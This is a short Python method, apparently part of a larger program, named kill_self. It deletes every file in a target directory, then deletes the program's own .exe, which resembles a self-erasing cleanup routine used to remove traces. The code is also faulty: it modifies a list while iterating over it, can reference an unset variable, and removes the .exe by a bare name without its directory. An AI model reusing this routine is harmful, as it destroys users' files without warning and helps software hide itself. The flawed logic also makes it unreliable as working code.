def kill_self(self):
    mass = os.listdir(self.way)
    for i in mass:
        if i.find('.exe') != -1:
            spec = i
            mass.remove(i)
    for i in mass:
        os.remove(f'{self.way}\\{i}')
    os.remove(spec)